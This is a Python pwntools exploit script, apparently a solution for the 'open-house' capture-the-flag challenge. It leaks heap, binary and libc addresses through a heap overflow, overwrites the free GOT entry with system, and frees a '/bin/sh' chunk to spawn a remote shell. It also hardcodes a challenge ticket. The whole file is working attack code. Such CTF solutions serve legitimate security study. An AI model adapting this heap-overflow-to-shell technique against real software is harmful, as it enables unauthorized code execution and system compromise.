from pwn import *
import sys
context.log_level = "debug"

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./open-house")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
else:
    p = remote("open-house-6dvpeatmylgze.shellweplayaga.me", 10001)
    # libc = ELF("./libc6-i386_2.31-0ubuntu9.2_amd64.so")

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a, b)

def debugf(b=0):
    if debug:
        if b:
            gdb.attach(p,"b *$rebase({b})".format(b = hex(b)))
        else:
            gdb.attach(p)
#context.terminal = ['tmux', 'splitw', '-h']
def check():
    ru('Ticket please: ')
    sl(b'ticket{StreetDeed544n23:gaVixliBvaQ2kmfgEJGTGexWuFwQx4S2R3stRpvhf9WN-T5d}')
def menu(c):
    ru('> ')
    sl(c)
def add(c):
    menu('c')
    ru('review!')
    sl(c)
def dele(idx):
    menu('d')
    ru('delete?')
    sl(str(idx))
def edit(idx,c):
    menu('m')
    ru('replace?')
    sl(str(idx))
    ru('with?')
    sl(c)
def view():
    menu('v')
debugf()
if debug == 0:
    check()
raw_input('> ')
base = 0x56555000
payload = b'a'*0x200
add(b'A'*0x200)
add(b'B'*0x200)


view()
ru(b"A"*0x200)
heap_base = u32(rv(4)) - 0x2860
print(hex(heap_base))

edit(3, b'C'*0x1ff+b"\x00"+p32(heap_base+0x3a4)+p32(heap_base+0x1430))
view()
ru(b"C"*0x1ff)
rv(8)
text_base = u32(rv(4)) - 0x3164
libc_main_got = text_base + 0x3120
free_got = libc_main_got + 4
print(hex(text_base))

edit(3, b'C'*0x1ff+b"\x00"+p32(libc_main_got)+p32(heap_base+0x1430))
view()
ru(b"C"*0x1ff)
rv(8)
'''
[!] 0xf7d52930
[!] 0x56598056
[!] 0xf7da1de0
[!] 0xf7d68e10
[!] 0xf7e10b80
[!] 0xf7dca470
[!] 0x565980a6
[!] 0xf7d7b530
'''
libc_start_main = u32(rv(4)) 
free = u32(rv(4)) 
fgets = u32(rv(4)) 
signal_addr = u32(rv(4)) 
alarm = u32(rv(4)) 
malloc = u32(rv(4)) 
exit_addr =u32(rv(4)) 
strtoul_addr  = u32(rv(4)) 
rv(4)
fpr = u32(rv(4))

libc_base = fpr-0x50a70
system = libc_base + 	0x49780
log.warning(hex(fgets))
log.warning(hex(fpr))
print(hex(libc_base))

edit(3, b'C'*0x1ff+b"\x00"+p32(free_got)+p32(heap_base+0x1430))
edit(4, p32(system)+p32(fgets))
# view()

edit(3, b"/bin/sh\x00")

dele(3)

p.interactive()